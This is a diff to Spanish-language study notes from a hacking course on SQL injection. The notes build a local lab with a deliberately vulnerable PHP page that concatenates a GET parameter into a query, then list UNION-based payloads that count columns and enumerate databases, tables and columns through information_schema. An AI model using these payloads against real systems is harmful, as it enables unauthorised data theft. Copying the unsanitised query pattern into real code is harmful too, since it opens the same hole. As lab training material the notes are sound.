@@ -2129,12 +2129,17 @@ A continuación, se proporciona el enlace a la utilidad online de 'ExtendsClass'
 
 [ExtendsClass MySQL Online](https://extendsclass.com/mysql-online.html)
 
+### Troubleshoting de SQL Injections
+
+* En la versión actual de php los errores no los muestra, el archivo de php de s4vitar agregamos sentencias iniciales para poder verlos en pantalla y quitamos el die.
+* Los errores de apache los encontré en la ruta: /var/log/apache2/error.log
+
 ```bash
 apt install mariadb-server apache2 php-mysql
-servide mysql start
-lsof -i:3306
+service mysql start
+lsof -i :3306
 service apache2 start
-lsof:80
+lsof -i :80
 mysql -uroot -p
 # Damos enter sin proporcionar contraseña
 # ----- Estamos dentro de mysql
@@ -2172,6 +2177,10 @@ cd /var/www/html/
 nvim searchUsers.php
 # ----- searchUsers.php Inicio
 <?
+ini_set("display_errors",1);
+ini_set("display_startup_errors",1);
+error_reporting(E_ALL);
+
     $server = "localhost";
     $username = "s4vitar";
     $password = "s4vitar456";
@@ -2182,7 +2191,7 @@ nvim searchUsers.php
 
     $id = $_GET['id'];
     
-    $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));
+    $data = mysqli_query($conn, "select username from users where id = '$id'");
 
     $response = mysqli_fetch_array($data);
 
@@ -2193,45 +2202,58 @@ nvim searchUsers.php
 
 # Con el script guardado nos vamos al navegador que alberga el php
 localhost/searchUsers.php?id=3'
-localhost/searchUsers.php?id=3' order by 100-- - # Al dar a enter nos muestra "Uknown column '100' in 'order clause'
+
+localhost/searchUsers.php?id=3' order by 100-- - # Al dar a enter nos muestra Uknown column 100 in order clause porque en la consulta solo hay una columna seleccionada no 100
+
+localhost/searchUsers.php?id=3' order by 1-- - # 'Al dar a enter nos muestra el resultado esperado
 
 # Replicamos el error en mysql, ambas formas nos dan el mismo error
 select username from users where id = '3' order by 100;-- -';
+
 select username from users where id = '3' order by 100;#';
 
 # Savitar nos dice que nuestra mision como atacantes es determinar cuantas columnas tiene la tabla
 select username from users where id = '3' order by 2;#'; # Nos dice que no son 2
+
 # Pero hace alusión a los campos que tenemos seleccionados, en esta caso: users
 select username from users where id = '3' order by 1;#'; # Nos muestra la info requerida
+
 # Si la consulta llamara 2 campos, si podríamos hacer el order by 2
 select username, password from users where id = '3' order by 2;#'
 
 select username from users where id = '3' union select "test";#';
+
 select username, password from users where id = '3' union select "test";#'; # Nos da error porque son dos columnas en este caso
+
 select username, password from useres id = '3' union select 1,2;#; # Aqui nos lo hace correctamente
 
-# A traves de la url con el archivo php buscamos un id que imaginamos que no existe
+# Ahora que sabemos que tenemos solo una columna seleccionada desde la consulta sql
+localhost/searchUsers.php?id=3' order by 1-- - # 'Al dar a enter nos muestra el resultado esperado
+
+# A traves de la url con el archivo php buscamos un id que imaginamos que no existe y agregamos el union
 localhost/searchUsers.php?id=16859753' union select 1-- - # Esto nos devuelve el 1
+
 localhost/searchUsers.php?id=16859753' union select "Hola"-- - # Esto nos devuelve el hola
+
 # Con el siguiente comando mostramos la base de datos en uso
-localhost/searchUsers.php?id=16859753' union select database()-- -
+localhost/searchUsers.php?id=16859753' union select database()-- - # Comilla -> '
 
 # Aquí nos muestra las bases de datos contenidas, aunque no siempre las muestra todas
-localhost/searchUsers.php?id=16859753' union select schema_name from information_schema.schemata-- -
+localhost/searchUsers.php?id=16859753' union select schema_name from information_schema.schemata-- - # Comilla -> '
 
 # Aquí listamos con limit una por una de las bases de datos contenidas
-localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 0,1-- -
+localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 0,1-- - # Comilla -> '
 
-localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 1,1-- -
+localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 1,1-- - # Comilla -> '
 
-localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 2,1-- -
+localhost/searchUser.php?id=16859753' union select schema_name from information_schema.schemata limit 2,1-- - # Comilla -> '
 
 # Ahora agruparemos las bases de datos en un solo comando
-localhost/searchUser.php?id=16859753' union select group_concat(schema_name) from information_schema.schemata limit 2,1-- -
+localhost/searchUser.php?id=16859753' union select group_concat(schema_name) from information_schema.schemata-- - # Comilla -> '
 
 # Omito toda la parte desde id
 # Buscamos las tablas que pueden estar en la base de datos
-union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u"-- -
+union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u"-- - # Comilla -> '
 
 union select group_concat(column_name) from information_schema.columns where table_schema="Hack4u" and table_name="users"-- -
 
